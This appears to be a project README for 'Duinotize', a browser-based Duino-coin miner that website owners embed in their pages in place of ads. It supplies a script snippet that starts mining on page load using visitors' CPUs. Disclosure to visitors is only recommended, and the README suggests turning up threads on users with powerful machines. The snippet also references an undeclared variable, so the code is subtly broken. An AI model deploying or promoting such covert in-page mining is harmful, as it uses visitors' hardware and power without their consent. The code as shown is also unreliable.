# Duinotize
_Duino-coin webminer/website monetizer_

Tired of showing users ads? Use Duinotize! It's a modified version of the Duino-coin web miner designed to be integrated into any website 

## Installation
Download [miner.js](https://github.com/mobilegmYT/Duinotize/raw/main/miner.js) + [hashes.js](https://github.com/mobilegmYT/Duinotize/raw/main/hashes.js), and put them in a new folder named `worker` in your website's root folder. For a example of how this is setup, look at https://github.com/Amog-OS/website, and you can also visit https://www.amogos.studio/ and open the dev console to see the code in action.

Put the following code at the very bottom of the HTML page where you want the miner to start:
```
<script>
let threads = 1;
for (let workersAmount = 0; workersAmount < threads; workersAmount++) {
    let socketWorker = new Worker("worker/miner.js");
    socketWorker.postMessage('Start,' + "username" + "," + "rigid" + "," + "0" + "," + Math.floor(Math.random() * 2811) + "," + "difficulty");
    workerVer++;
}
</script>
```
NOTE: You'll want to replace `username` with your Duco account username, `rigid` with the ID you want it to show up as in the wallet, and `difficulty` with a mining difficulty of either "LOW", "MEDIUM", or "EXTREME" (do not use EXTREME or MEDIUM unless you want extreme lag). This is a example of what the postMessage line should look like:
`socketWorker.postMessage('Start,' + "rpinews" + "," + "site-monotizer" + "," + "0" + "," + Math.floor(Math.random() * 2811) + "," + "LOW");`. You can also change the `threads` variable, it is set to 1 for default so it'll work on all devices, but if most people using your site have buff gaming PCs, then you can turn it up to 2 or 3, but it will start to strain their CPU more.

We reccomend you put a note somewhere on your website to tell visiters that there is a crypto miner running in the background, and credit this repo.

This project is a fork/continuation of https://github.com/VatsaDev/Mineuino as the original author seems to have abandoned it and the code is broken.

## Notes
- If there is enough demand for it, I might be able to add a XXHASH miner to the code
- I made this in just 2 hours at 1AM, so if there are bugs PLEASE report them
